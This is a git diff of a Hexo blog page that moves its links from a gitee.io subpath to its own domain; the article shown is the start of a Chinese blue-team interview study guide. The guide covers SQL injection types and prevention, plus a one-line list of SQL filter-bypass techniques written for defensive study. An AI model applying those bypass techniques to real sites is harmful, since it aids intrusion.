@@ -5,82 +5,82 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 6.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/wan1/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="2022初级蓝队面试不是什么大佬，溯源不太会就给个思路 这里就准备一下我的复习资料吧 大概会分为几个模块进行复习 漏洞原理  应急响应  常见应急响应案例   溯源  前沿漏洞  中间件漏洞以及常见端口等杂项问题 以及一个开局话术 开局话术面试官好，我是（叫）xxx ，目前在四川成都，然后目前我们学校已经结课了，我这边确定有时间参加护网，我是从去年开始接触网安或者说 学渗透的，前期主要在 b 站看">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022初级蓝队面试">
-<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/index.html">
+<meta property="og:url" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/index.html">
 <meta property="og:site_name" content="十三の博客">
 <meta property="og:description" content="2022初级蓝队面试不是什么大佬，溯源不太会就给个思路 这里就准备一下我的复习资料吧 大概会分为几个模块进行复习 漏洞原理  应急响应  常见应急响应案例   溯源  前沿漏洞  中间件漏洞以及常见端口等杂项问题 以及一个开局话术 开局话术面试官好，我是（叫）xxx ，目前在四川成都，然后目前我们学校已经结课了，我这边确定有时间参加护网，我是从去年开始接触网安或者说 学渗透的，前期主要在 b 站看">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606160636312.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172901546.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616161354087.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172913149.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606180504575.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204100713.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616003137358.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606215950542.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204521867.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220607005009412.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615202911911.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615203001610.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220611162251120.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606160636312.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172901546.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616161354087.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172913149.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606180504575.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204100713.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616003137358.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606215950542.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204521867.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220607005009412.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615202911911.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615203001610.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220611162251120.png">
 <meta property="og:image" content="http://39.99.247.218:8081/static/d2luLTgtMS5wbmc=1653544352">
 <meta property="og:image" content="http://39.99.247.218:8081/static/d2luLTgtMi5wbmc=1653544276">
 <meta property="og:image" content="http://39.99.247.218:8081/static/d2luLTgtMy5wbmc=1653544367">
 <meta property="og:image" content="http://39.99.247.218:8081/static/d2luLTgtNC5wbmc=1653544339">
 <meta property="og:image" content="http://39.99.247.218:8081/static/d2luLTgtNS5wbmc=1653544334">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144014925.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144342246.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144346894.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144353800.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002422083.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615195653696.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615200123174.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204218916.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204425176.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204615956.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002440960.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002454227.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920190833089.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002859095.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103236191.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103245713.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103255437.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103307691.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103314706.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103546015.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103559468.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616162629488.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225637341.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225652582.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220919142934218.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920161729837.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144014925.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144342246.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144346894.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144353800.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002422083.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615195653696.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615200123174.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204218916.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204425176.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204615956.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002440960.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002454227.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920190833089.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002859095.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103236191.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103245713.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103255437.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103307691.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103314706.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103546015.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103559468.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616162629488.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225637341.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225652582.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220919142934218.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920161729837.png">
 <meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTnuLQX4zBvtYlCPbOm0XIdcBrdd23EKTxQgGedN3BiayXfoJoDGvkOCaGhU8X7kqkXVB3bgh6RPF9Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
 <meta property="og:image" content="https://pic3.zhimg.com/80/v2-ba97144a5e31a44a4103975bb4b092c6_720w.jpg">
 <meta property="article:published_time" content="2022-07-09T07:24:16.000Z">
 <meta property="article:modified_time" content="2022-09-25T04:54:36.000Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png">
+<meta name="twitter:image" content="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png">
 
-<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/">
+<link rel="canonical" href="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/">
 
 
 <script id="page-configurations">
@@ -142,7 +142,7 @@
 
   <div class="site-meta">
 
-    <a href="/wan1/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">十三の博客</h1>
       <span class="logo-line-after"><i></i></span>
@@ -163,92 +163,92 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-ctf做题笔记">
 
-    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
 
   </li>
         <li class="menu-item menu-item-python">
 
-    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
 
   </li>
         <li class="menu-item menu-item-java">
 
-    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
 
   </li>
         <li class="menu-item menu-item-读书笔记">
 
-    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
 
   </li>
         <li class="menu-item menu-item-渗透测试">
 
-    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
 
   </li>
         <li class="menu-item menu-item-基础">
 
-    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
 
   </li>
         <li class="menu-item menu-item-轮子">
 
-    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
 
   </li>
         <li class="menu-item menu-item-漏洞库">
 
-    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
 
   </li>
         <li class="menu-item menu-item-工具">
 
-    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
 
   </li>
         <li class="menu-item menu-item-代码审计">
 
-    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
 
   </li>
         <li class="menu-item menu-item-逆向">
 
-    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
 
   </li>
         <li class="menu-item menu-item-应急响应">
 
-    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
 
   </li>
         <li class="menu-item menu-item-免杀">
 
-    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
 
   </li>
         <li class="menu-item menu-item-靶场">
 
-    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
 
   </li>
         <li class="menu-item menu-item-cve申请">
 
-    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
 
   </li>
         <li class="menu-item menu-item-c语言">
 
-    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -306,10 +306,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="十三">
       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -344,7 +344,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
+                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
                 </span>
             </span>
 
@@ -370,7 +370,7 @@
 <p>按注入点：数字，字符，搜索</p>
 <p>按数据提交方式：get,post,cookie,http</p>
 <p>按执行效果：布尔，时间，报错，联合，堆叠，宽字节</p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png" alt="image-20220616172850329"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png" alt="image-20220616172850329"></p>
 <h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">预编译法；</span><br><span class="line">避免从前端传不必要的值；</span><br><span class="line">对传入的参数进行过滤。</span><br></pre></td></tr></table></figure>
 
 <h3 id="sql绕过"><a href="#sql绕过" class="headerlink" title="sql绕过"></a>sql绕过</h3><p>大小写混合，url编码，注释，参数污染，特殊符号绕过比如科学技术法，垃圾数据溢出</p>
@@ -381,7 +381,7 @@
